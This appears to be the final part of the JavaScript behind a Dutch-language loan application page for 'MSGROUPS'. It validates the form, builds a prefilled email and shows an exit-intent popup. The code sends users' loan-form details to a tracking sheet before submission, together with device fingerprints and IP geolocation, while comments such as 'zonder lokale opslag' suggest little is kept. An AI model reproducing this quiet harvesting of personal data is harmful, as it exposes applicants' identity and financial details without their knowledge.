                <button id="exit-intent-close" style="background:transparent; border:none; color:var(--muted); font-size:.9rem; cursor:pointer; text-decoration:underline;">Nee bedankt, ik kom later terug</button>
            </div>`;

        document.body.appendChild(popup);

        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
            #exit-intent-cta:hover { background:#15a34a !important; transform: translateY(-2px); }`;
        document.head.appendChild(style);

        document.getElementById('exit-intent-cta')?.addEventListener('click', () => {
            popup.remove();
            const submitBtn = document.querySelector('.cta-submit');
            if (submitBtn) {
                ctaClicked = true;
                // CTA-event verzenden (via popup)
                sendCTAEventToSheet('Mijn aanvraag nu afronden (popup)');
                submitBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                submitBtn.style.animation = 'pulse 1s ease 3';
            }
        });
        document.getElementById('exit-intent-close')?.addEventListener('click', () => popup.remove());
        popup.addEventListener('click', (e) => { if (e.target === popup) popup.remove(); });
    }

    document.addEventListener('mouseleave', (e) => { if (e.clientY < 10) showExitIntentPopup(); });
    window.addEventListener('beforeunload', (e) => {
        const elapsed = (Date.now() - pageStartTime) / 1000;
        if (!formState.exitIntentShown && formState.formCompleted && !ctaClicked && elapsed >= 90) {
            e.preventDefault();
            e.returnValue = '';
            showExitIntentPopup();
        }
    });

    const ctaBtn = document.querySelector('.cta-submit');
    if (ctaBtn) {
        ctaBtn.addEventListener('click', () => { 
            ctaClicked = true; 
            // CTA-event verzenden (hoofdknop)
            const label = (ctaBtn.textContent || '').trim();
            sendCTAEventToSheet(label || 'cta_submit');
        });
    }

    // ========================================
    // 12. REALTIME VALIDATIE (zonder opslag)
    // ========================================
    function setupRealTimeValidation() {
        const prenomInput = document.getElementById('prenom');
        const nomInput = document.getElementById('nom');
        const dateInput = document.getElementById('date-naissance');
        const emailInput = document.getElementById('email');
        const whatsappInput = document.getElementById('whatsapp');
        const paysSelect = document.getElementById('pays');

        [prenomInput, nomInput, dateInput, emailInput, whatsappInput, paysSelect].forEach(input => {
            if (input) {
                input.addEventListener('blur', validateStep1);
                input.addEventListener('change', () => {
                    validateStep1();
                    if (!formState.formStarted) formState.formStarted = true;
                });
            }
        });

        if (emailInput) {
            emailInput.addEventListener('blur', function() {
                const email = this.value.trim();
                if (email && !isValidEmail(email)) {
                    this.setCustomValidity('Ongeldig e-mailadres');
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        if (whatsappInput) {
            whatsappInput.addEventListener('blur', function() {
                const phone = this.value.trim();
                if (phone && !isValidPhone(phone)) {
                    this.setCustomValidity('Ongeldig nummer');
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        const raisonInput = document.getElementById('raison');
        if (raisonInput) {
            raisonInput.addEventListener('input', validateStep2);
            raisonInput.addEventListener('blur', function() {
                const validation = validateRaison(this.value);
                if (this.value && !validation.valid) {
                    this.setCustomValidity(validation.error);
                    this.style.borderColor = '#dc2626';
                } else {
                    this.setCustomValidity('');
                    this.style.borderColor = '';
                }
            });
        }

        const statutSelect = document.getElementById('statut');
        const revenusSelect = document.getElementById('revenus');
        [statutSelect, revenusSelect].forEach(select => {
            if (select) select.addEventListener('change', validateStep3);
        });
    }

    // ========================================
    // 13. FORMULIERINDIENING (VOORGEVULDE E-MAIL)
    // ========================================
    function buildPrefilledEmail() {
        const prenom = (document.getElementById('prenom')?.value || '').trim();
        const nom = (document.getElementById('nom')?.value || '').trim();
        const fullName = `${prenom} ${nom}`.trim();
        const dateNaissance = (document.getElementById('date-naissance')?.value || '').trim();
        const email = (document.getElementById('email')?.value || '').trim();
        const whatsapp = (document.getElementById('whatsapp')?.value || '').trim();
        const pays = (document.getElementById('pays')?.value || '').trim();
        const montantVal = parseFloat(document.getElementById('montant')?.value || '0');
        const montantFmt = formatMontant(montantVal);
        const dureeMois = (document.getElementById('duree')?.value || '').trim();
        const raison = (document.getElementById('raison')?.value || '').trim();
        const statut = (document.getElementById('statut')?.value || '').trim();
        const revenus = (document.getElementById('revenus')?.value || '').trim();

        const pieces = [];
        if (document.getElementById('piece1')?.checked) pieces.push('identiteitskaart');
        if (document.getElementById('piece2')?.checked) pieces.push('inkomensbewijs');
        if (document.getElementById('piece3')?.checked) pieces.push('recent bankafschrift');

        const mensualite = calculerMensualite(montantVal, parseInt(dureeMois || '0', 10), CONFIG.tauxInteret);
        const mensualiteFmt = formatEuros(isFinite(mensualite) ? mensualite : 0);

        const subject = `financieringsaanvraag ${montantFmt} ${nom} ${prenom}`.trim();

        const lines = [
            'Beste,',
            '',
            'Ik neem contact met u op voor een financieringsaanvraag bij MSGROUPS.',
            `Mijn naam is ${fullName || '—'}, geboren op ${dateNaissance || '—'}, en ik woon in ${pays || '—'}.`,
            `Ik wil een financiering verkrijgen van ${montantFmt} over ${dureeMois || '—'} maanden${raison ? ` voor ${raison}.` : '.'}`,
            `Mijn geschatte maandtermijn (indicatieve rente ${CONFIG.tauxInteret} %/jaar) bedraagt ${mensualiteFmt}.`,
            '',
            'Mijn contactgegevens voor eventuele vragen:',
            `• E-mail: ${email || '—'}`,
            '',
            `• WhatsApp: ${whatsapp || '—'}`,
            '',
            `Situatie: ik ben momenteel ${statut || '—'}${revenus ? ` en ${revenus.toLowerCase()}` : ''}.`,
            `Beschikbare documenten: ${pieces.length ? pieces.join(' en ') : 'op verzoek beschikbaar'}.`,
            '',
            'Ik sta natuurlijk ter beschikking voor verdere informatie of aanvullende documenten.',
            '',
            'Met vriendelijke groet,',
            `${fullName || ''}`
        ];
        const body = lines.join('\n');

        const mailto = `mailto:Contact@sergemagdeleinesolutions.fr?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
        return mailto;
    }

    // ====== SECURITY PATCH: neutraliseert de "mailto:"-actie zonder bloquer l’autocomplétion
    const form = document.querySelector('form[action^="mailto"], form[action*="mailto"]') || document.getElementById('lead-form');
    if (form) {
        try {
            if (!form.dataset.mailto) {
                const raw = form.getAttribute('action') || '';
                const addr = raw.startsWith('mailto:') ? raw.replace(/^mailto:/i, '') : 'Contact@sergemagdeleinesolutions.fr';
                form.dataset.mailto = addr;
            }
            // On garde l’autocomplete actif pour éviter les warnings du navigateur
            form.setAttribute('action', '#secure-submit');
            form.setAttribute('method', 'post');
            form.setAttribute('autocomplete', 'on'); // <-- éviter "saisie auto désactivée"
            // NE PAS forcer les champs à désactiver l’autofill (on laisse tels quels)
        } catch (e) {
            if (CONFIG.debugMode) console.warn('SECURITY PATCH form rewrite error:', e);
        }
    }
    // ====== EINDE SECURITY PATCH ======

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            validateStep1();
            validateStep2();
            validateStep3();

            if (!formState.step1Valid || !formState.step2Valid || !formState.step3Valid) {
                let allErrors = [];
                if (formState.validationErrors.step1.length > 0) {
                    allErrors.push('STAP 1 - Basisinformatie:');
                    allErrors.push(...formState.validationErrors.step1.map(er => '  • ' + er));
                }
                if (formState.validationErrors.step2.length > 0) {
                    allErrors.push('\nSTAP 2 - Uw lening:');
                    allErrors.push(...formState.validationErrors.step2.map(er => '  • ' + er));
                }
                if (formState.validationErrors.step3.length > 0) {
                    allErrors.push('\nSTAP 3 - Uw profiel:');
                    allErrors.push(...formState.validationErrors.step3.map(er => '  • ' + er));
                }
                showNotification('Onvolledig formulier', 'Corrigeer de volgende fouten:\n\n' + allErrors.join('\n'), 'error');
                return false;
            }

            // Dernier autosave + marquage CTA (feuille Google Apps Script)
            const label = (document.querySelector('.cta-submit')?.textContent || '').trim() || 'cta_submit';
            sendCTAEventToSheet(label);

            // Construction du mailto
            const mailtoLink = buildPrefilledEmail();

            // ==============================
            // CONVERSIONS GOOGLE ADS (AJOUT)
            // ==============================
            // 1) Conversion "lead" valeur 1 EUR
            safeGtagEvent('conversion', {
              'send_to': 'AW-17656608344/SQ5vCIPgr64bENjsqeNB',
              'value': 1.0,
              'currency': 'EUR'
            });

            // 2) Conversion avec callback + redirection vers mailto
            // On déclenche UNIQUEMENT ici (CTA principal, formulaire valide)
            if (typeof window.gtag_report_conversion === 'function') {
              // Utilise le callback pour ouvrir la boîte mail (lancement garanti après l'event)
              return window.gtag_report_conversion(mailtoLink);
            } else {
              // Fallback (si gtag non prêt), on redirige quand même
              window.location.href = mailtoLink;
              setTimeout(() => {
                showNotification('✅ Aanvraag klaar in uw e-mail', 'Controleer uw e-mailapp (concept geopend).', 'success');
              }, 600);
              return true;
            }
        });
    }

    // ========== CARROUSEL ==========
    const carousel = document.querySelector('.testimonials-carousel');
    const dots = document.querySelectorAll('.carousel-dot');
    let currentSlide = 0;

    if (carousel && dots.length > 0) {
        function goToSlide(index) {
            const slides = document.querySelectorAll('.testimonial-slide');
            if (index < 0 || index >= slides.length) return;
            currentSlide = index;
            const slideWidth = carousel.scrollWidth / slides.length;
            const scrollAmount = slideWidth * currentSlide;
            carousel.scrollTo({ left: scrollAmount, behavior: 'smooth' });
            updateDots();
        }

        function updateDots() {
            dots.forEach((dot, index) => {
                if (index === currentSlide) dot.classList.add('active');
                else dot.classList.remove('active');
            });
        }

        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => goToSlide(index));
        });

        updateDots();
    }

    // ========== MELDINGEN ==========
    function showNotification(title, message, type = 'info') {
        const icons = { info: 'ℹ️', success: '✅', warning: '⚠️', error: '❌' };
        alert(`${icons[type]} ${title}\n\n${message}`);
    }

    // ========== SOEPEL SCROLLEN ==========
    function enableSmoothScroll() {
        const style = document.createElement('style');
        style.textContent = `html { scroll-behavior: smooth; }`;
        document.head.appendChild(style);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href === '#' || href === '#!') return;
            const target = document.querySelector(href);
            if (target) {
                e.preventDefault();
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                const menuToggle = document.getElementById('menu-toggle');
                if (menuToggle && menuToggle.checked) menuToggle.checked = false;
            }
        });
    });

    // ========== MOBIEL MENU ==========
    const menuToggle = document.getElementById('menu-toggle');
    if (menuToggle) {
        document.addEventListener('click', function(e) {
            const navMenu = document.querySelector('.nav-menu');
            const menuIcon = document.querySelector('.menu-icon');
            if (menuToggle.checked && navMenu && !navMenu.contains(e.target) && !menuIcon.contains(e.target)) {
                menuToggle.checked = false;
            }
        });
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && menuToggle.checked) {
                menuToggle.checked = false;
            }
        });
    }

    // ========================================
    // 14. VERZAMELEN + VERSTUREN → SHEET (TOEGEVOEGD)
    // ========================================

    // Parse UTM + referrer + landing
    function parseAcquisition() {
        const url = new URL(window.location.href);
        const p = url.searchParams;
        return {
            referrer: document.referrer || '',
            landing_url: window.location.href,
            utm_source: p.get('utm_source') || '',
            utm_medium: p.get('utm_medium') || '',
            utm_campaign: p.get('utm_campaign') || ''
        };
    }

    // Device / browser / scherm
    function deviceInfo() {
        const ua = navigator.userAgent || navigator.userAgentData || '';
        const platform = navigator.platform || '';
        const lang = (navigator.language || (navigator.languages && navigator.languages[0]) || '').toLowerCase();
        const tzOffsetMin = (new Date()).getTimezoneOffset(); // minuten

        // Eenvoudige detectie
        let device_type = 'desktop';
        const w = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
        if (w <= 768) device_type = 'mobile';
        else if (w > 768 && w <= 1024) device_type = 'tablet';

        // OS & browser (zeer basaal)
        let os = /Windows/i.test(ua) ? 'Windows'
              : /Mac/i.test(ua) ? 'macOS'
              : /Android/i.test(ua) ? 'Android'
              : /iPhone|iPad|iPod/i.test(ua) ? 'iOS'
              : /Linux/i.test(ua) ? 'Linux'
              : platform || 'unknown';

        let browser = /Chrome/i.test(ua) ? 'Chrome'
                    : /Safari/i.test(ua) ? 'Safari'
                    : /Firefox/i.test(ua) ? 'Firefox'
                    : /Edg/i.test(ua) ? 'Edge'
                    : /OPR|Opera/i.test(ua) ? 'Opera'
                    : 'Unknown';

        return {
            device_type,
            os,
            browser,
            user_agent: String(ua),
            screen_width: (window.screen && window.screen.width) || '',
            screen_height: (window.screen && window.screen.height) || '',
            viewport_width: w,
            viewport_height: Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0),
            device_pixel_ratio: window.devicePixelRatio || 1,
            language: lang,
            timezone_offset_min: tzOffsetMin
        };
    }

    // Geo IP (best effort, zonder sleutel) — ipapi.co
    function fetchGeoAndSendOnce(basePayload) {
        // We proberen een netwerkcall; als het mislukt, versturen we zonder geo
        fetch('https://ipapi.co/json/', { method: 'GET' })
            .then(r => r.ok ? r.json() : null)
            .then(data => {
                const geo = {
                    country: (data && (data.country_name || data.country)) || '',
                    city: (data && data.city) || ''
                };
                postToSheet(Object.assign({}, basePayload, geo));
            })
            .catch(() => {
                postToSheet(basePayload);
            });
    }

    // Snapshot van formulierwaarden
    function readFormSnapshot() {
        // Stap 1
        const prenom = (document.getElementById('prenom')?.value || '').trim();
        const nom = (document.getElementById('nom')?.value || '').trim();
        const email = (document.getElementById('email')?.value || '').trim();
        const whatsapp = (document.getElementById('whatsapp')?.value || '').trim();
        const pays = (document.getElementById('pays')?.value || '').trim();
        const dateNaissance = (document.getElementById('date-naissance')?.value || '').trim();

        // Stap 2
        const montant = Number(document.getElementById('montant')?.value || '') || '';
        const duree = Number(document.getElementById('duree')?.value || '') || '';
        const raison = (document.getElementById('raison')?.value || '').trim();

        // Stap 3
        const statut = (document.getElementById('statut')?.value || '').trim();
        const revenus = (document.getElementById('revenus')?.value || '').trim();

        // Documenten (samengevoegd)
        const pieces = [];
        if (document.getElementById('piece1')?.checked) pieces.push('Identiteitskaart');
        if (document.getElementById('piece2')?.checked) pieces.push('Inkomensbewijs');
        if (document.getElementById('piece3')?.checked) pieces.push('Recent bankafschrift');

        return {
            form_prenom: prenom,
            form_nom: nom,
            form_email: email,
            form_whatsapp: whatsapp,
            form_pays: pays,
            form_date_naissance: dateNaissance,
            form_montant_eur: montant,
            form_duree_mois: duree,
            form_raison: raison,
            form_statut: statut,
            form_revenus: revenus,
            form_pieces: pieces.join(' en ')
        };
    }

    // Throttle/debounce voor autosave (spam voorkomen)
    let autosaveTimer = null;
    function autosaveToSheet() {
        clearTimeout(autosaveTimer);
        autosaveTimer = setTimeout(() => {
            const base = {
                session_id: SESSION.id,
                last_event: 'form_autosave'
            };
            const payload = Object.assign({}, base, readFormSnapshot());
            postToSheet(payload);
        }, 400);
    }

    // CTA-event
    function sendCTAEventToSheet(label) {
        const payload = Object.assign({
            session_id: SESSION.id,
            cta_clicked: true,
            cta_label: label || 'cta_submit',
            last_event: 'cta_click'
        }, readFormSnapshot());
        postToSheet(payload);
    }

    // Eerste "session_start" (met device + acquisition + ts_open)
    function sendSessionStart() {
        const acq = parseAcquisition();
        const dev = deviceInfo();
        const base = Object.assign({
            session_id: SESSION.id,
            ts_open: SESSION.openedAtISO,
            last_event: 'session_start'
        }, acq, dev);

        // Probeer Geo IP toe te voegen; zo niet, toch versturen
        fetchGeoAndSendOnce(base);
    }

    // ========================================
    // INITIALISATIE
    // ========================================
    function init() {
        console.log('🚀 Initialisatie MSGROUPS (zonder lokale opslag)...');

        enableSmoothScroll();
        setupPromoBannerTimer();
        setupDateFormatting();
        createNextButtons();
        setupVideoPlayers();
        injectSummaryHitboxStyles();

        // Sessiestart versturen (met device/referrer/utm/geo)
        sendSessionStart();

        setTimeout(() => {
            validateStep1();
            validateStep2();
            validateStep3();
            afficherResumePret();
        }, 200);

        preventStepOpening();
        setupRealTimeValidation();

        // Autosave als sliders veranderen (al aangeroepen in validateStep2, extra zekerheid)
        if (montantSlider) montantSlider.addEventListener('change', autosaveToSheet);
        if (dureeSlider) dureeSlider.addEventListener('change', autosaveToSheet);

        console.log('✅ MSGROUPS - Klaar!  Sessie:', SESSION.id);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
</script>
